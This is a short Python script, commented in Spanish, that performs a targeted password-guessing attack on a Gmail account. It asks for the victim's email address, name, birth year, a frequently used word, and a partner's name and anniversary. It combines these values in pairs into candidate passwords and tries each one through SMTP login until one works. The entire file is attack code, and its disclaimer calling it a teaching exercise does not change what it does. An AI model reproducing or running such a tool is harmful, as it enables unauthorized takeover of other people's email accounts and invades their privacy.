#-*-coding: utf-8 -*-
# lo que hagas con este programa no es mo responsabilidad, este es solo un programa de practica con fines
# didacticos.

import smtplib
if __name__ == '__main__':
	server = smtplib.SMTP('smtp.gmail.com:587')
	server.starttls()
	data = []
	user = str(raw_input("introduce el correo electronico: "))
	name = str(raw_input("introduce el nombre de la victima: "))
	data.append(name)
	year = str(raw_input("introduce el año en el que nació {}: ".format(name)))
	data.append(year)
	word = str(raw_input("introduce una palabra que {} use mucho: ".format(name)))
	data.append(word)
	couple = str(raw_input("{} tiene pareja? Y/N ".format(name)))
	if couple == "y" or couple == "Y":
		couple2 = str(raw_input("introduce el nombre de su pareja: "))
		data.append(couple2)
		anniversary = str(raw_input("cuando es el aniversario de {} y {}?: ".format(name, couple2)))
		data.append(anniversary)
	for passw in data:
		for passw2 in data:
			rpass = passw + passw2
			try:
				server.login(user,rpass)
			except Exception as e:
				print("{} no es la clave correcta".format(rpass))
			else:
				print("{} es la clave de {}".format(rpass, user))
				server.quit()
				exit()
	server.quit()